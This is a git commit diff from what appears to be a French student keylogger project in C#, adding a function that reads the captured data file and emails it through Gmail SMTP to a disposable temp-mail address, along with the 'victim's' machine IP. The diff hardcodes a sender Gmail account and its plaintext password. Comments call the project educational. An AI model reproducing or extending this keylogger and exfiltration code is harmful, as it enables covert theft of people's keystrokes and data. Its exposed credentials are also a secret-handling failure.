66f525dbd394f96ada6ab66b0d0536d46b38e801
Stephane Ly <stly@univ-lyon2.fr>
2020-12-30 13:40:51 +0100

    Ajout de la fonctionnalité d'envoie par mail!

--- ProjetKeyLogger/KeyLogger.cs
+++ ProjetKeyLogger/KeyLogger.cs
@@ -184,7 +184,7 @@ namespace ProjetKeyLogger
                             collection_enregistrement = new CollectionEnregistrement();
 
                             //Puis on envoie un mail
-
+                            envoieMail();
                         }
 
 
@@ -194,11 +194,11 @@ namespace ProjetKeyLogger
         }
 
 
-        //Envoyer le txt pr mail ?
+        //Envoyer du fichier par mail
         private void envoieMail()
         {
-            string Chemin_Dossier = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
-            string Chemin_Txt = Chemin_Dossier + @"\CaptureClavier.txt";
+            string Chemin_Dossier = "../../../Fichier XML";
+            string Chemin_Txt = Chemin_Dossier + @"/TestXML.xml";
 
             //recuperation du contenu du fichier
             string Contenu = File.ReadAllText(Chemin_Txt);
@@ -210,8 +210,6 @@ namespace ProjetKeyLogger
             //recuperation de l'adresse ip de l'ordinateur pour identifier notre victime
             var Nom_Ordinateur = Dns.GetHostEntry(Dns.GetHostName());
 
-            //faire si jamais l'ordi a plusieurs adresse ip ?
-
             //Création du corps du mail
             //Utiliser les autres fonctions de charlie 
             string Corps_Mail = "date :" + Date_Mail + "\n Adresse ip de la victime :" + Nom_Ordinateur + "\n";
@@ -222,23 +220,26 @@ namespace ProjetKeyLogger
             SmtpClient Client = new SmtpClient("smtp.gmail.com", 587);
             MailMessage Message_Mail = new MailMessage();
 
-            //definition de l'adresse source à mettre entre les guillemets
-            Message_Mail.From = new MailAddress("xxx@gmail.com");
+            //definition de l'adresse mail qui envoie
+            //Cette adresse à été crée spécialement pour ce projet à but non lucratif et seulement éducatif.
+            Message_Mail.From = new MailAddress("jordan.leeon2@gmail.com");
 
             //definition de l'adresse de destination 
-            Message_Mail.To.Add("xxx@gmail.com");
+            //Création d'un mail temporaire. On peut aussi mettre notre adresse mail!
+            //site de création du mail : temp-mail.org
+            Message_Mail.To.Add("jejarer632@nonicamy.com");
 
             //defition de l'objet du mail
             Message_Mail.Subject = Objet_Mail;
 
-            //En rapport avec l'authentification à l'adresse mail mais vérifier pq on met à false
+            //En true, elle utilise les identifiant de l'utilisateur actuel. En false, elle utilise les valeurs que nous lui donnons plus bas
             Client.UseDefaultCredentials = false;
 
             //utilisation du protocole SSL (Secure sockets Layer) pour transporter de manière sécurisée
             Client.EnableSsl = true;
 
-            //remplacer les guillemets avec les vraies valeurs
-            Client.Credentials = new System.Net.NetworkCredential("adresse", "le mot de passe de la'dresse");
+            //UseDefaultCredentials étant déclaré en False, il faut lui fournier les inforamtions de connexion 
+            Client.Credentials = new System.Net.NetworkCredential("jordan.leeon2@gmail.com", "projetc#2020");
 
             //définition du corps du mail
             Message_Mail.Body = Corps_Mail;
